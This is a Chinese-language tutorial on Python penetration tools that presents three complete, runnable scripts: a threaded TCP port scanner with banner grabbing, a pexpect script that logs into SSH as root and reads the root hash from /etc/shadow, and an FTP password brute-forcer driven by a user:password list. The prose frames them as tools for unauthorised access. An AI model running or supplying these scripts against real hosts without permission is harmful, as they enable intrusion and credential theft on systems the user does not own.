### 			python之常用渗透工具

##### 1. TCP端口扫描脚本

​	任何一个靠谱的网络攻击都是起步于侦查的。攻击者必须在挑选并确定利用目标中的漏洞之前，找出目标在哪里有漏洞。

　　编写一个扫描目标主机开放的TCP端口的python小脚本。

　　（1）套接字：socket

　　（2）解析命令行参数：optparse

　　（3）多线程：threading

　　　　Semaphore管理一个内置的计数器，

　　　　每当调用acquire()时内置计数器-1；

　　　　调用release() 时内置计数器+1；

　　　　计数器不能小于0；当计数器为0时，acquire()将阻塞线程直到其他线程调用release()。 

```python
#! /usr/bin/python
# -*-coding:utf-8 -*-

import optparse
from socket import *
import threading

screenLock = threading.Semaphore(value=1)


def connScan(tgtIP, tgtPort):
    try:
        connSkt = socket(AF_INET, SOCK_STREAM)
        connSkt.connect((tgtIP, tgtPort))
        connSkt.send('---------------------')
        results = connSkt.recv(2048)
        screenLock.acquire()
        print('[+] %d/tcp open' % tgtPort)
        print('[+] received information: ' + str(results))
    except:
        screenLock.acquire()
        print('[-] %d/tcp closed' % tgtPort)
    finally:
        screenLock.release()
        connSkt.close()


def portScan(tgtHost, tgtPosts):
    try:
        tgtIP = gethostbyname(tgtHost)
    except:
        print("[-] Cannot resolve '%s': unKnown host " % tgtHost)
        return
    try:
        tgtName = gethostbyaddr(tgtIP)
        print('\n[+] Scan Result for Host : ' + tgtName[0])
    except:
        print('\n[+] Scan Result for IP : ' + tgtIP)

    setdefaulttimeout(1)

    for tgtPort in tgtPosts:
        print("Scanning port " + tgtPort)
        t = threading.Thread(target=connScan, args=(tgtIP, int(tgtPort)))
        t.start()


if __name__ == '__main__':

    parser = optparse.OptionParser('Usage:\n -H <target_host/target_ip> -p <target_port[s]>')
    parser.add_option('-H', dest='target_host', type='string', help='specify target host')
    parser.add_option('-p', dest='target_port', type='string', help='specify target port[s]')

    (options, args) = parser.parse_args()

    tgtHost = options.target_host
    tgtPorts = options.target_port.split(',')

    if (tgtHost == None) | (tgtPorts[0] == None):
        print(parser.usage)
        exit(0)
    portScan(tgtHost, tgtPorts)
```

##### 2. 非授权登录SSH

​	（1）用[pexpect](http://pexpect.readthedocs.io/en/stable/)与SSH交互

​	Pexpect 是一个用来启动子程序并对其进行自动控制的 Python 模块。Pexpect 可以用来和像 ssh、ftp、passwd、telnet 等命令行程序进行自动交互,等待屏幕输出，并据此做出不同的响应。

```python
#! /usr/bin/env python
# -*- coding:utf-8 -*-
import pexpect

prompt=['# ','>>> ','> ','\$ ']
def send_command(child,cmd):

    child.sendline(cmd)
    child.expect(prompt)
    print(child.before)

def connect(user,host,password):

    ssh_newkey = 'Are you sure you want to continue connecting (yes/no)?'
    connStr ='ssh '+user+'@'+host
    child=pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT,ssh_newkey])
    if ret == 0:
        print('[-] Error Connecting')
        return
    if ret ==1:
        child.sendline('yes')
        ret=child.expect([pexpect.TIMEOUT,'[P|p]assword:'])
    if ret == 0:
        print('[-] Error Connecting')
        return
    child.sendline(password)
    child.expect(prompt)
    return child

if __name__ == '__main__':

    host = 'localhost'
    user = 'root'
    password = 'toor'
    child = connect(user,host,password)
    send_command(child,'cat /etc/shadow | grep root')
```



##### 3. 使用ftplib暴力破解FTP用户口令脚本

​	虽然匿名访问是进入系统的方式之一，但攻击者也能成功地用偷来的用户名/密码访问合法的FTP服务器。

　　通过遍历用户名:密码对的列表，暴力猜解FTP用户口令

```python
#! /usr/bin/python
# -*-coding:utf-8 -*-

import ftplib
import optparse


def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print("[+] Trying: " + userName + "/" + passWord)
        try:

            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print('\n[*]' + str(hostname) + 'FTP Login Succeeded!:' + userName + "/" + passWord)
            ftp.quit()
            return (userName, passWord)
        except Exception:
            pass

    print("\n[-] Could not brute force FTP.")
    return (None, None)


if __name__ == '__main__':

    parser = optparse.OptionParser('Usage:\n -H <target host> -f <user:password  list>')
    parser.add_option('-H', dest='hostname', type='string', help='specify target host')
    parser.add_option('-f', dest='passwdFile', type='string', help='specify ftp_login file')

    (options, args) = parser.parse_args()

    tgtHost = options.hostname
    passwdFile = options.passwdFile
    if (tgtHost == None) | (passwdFile == None):
        print(parser.usage)
        exit(0)

    bruteLogin(tgtHost, passwdFile)
```

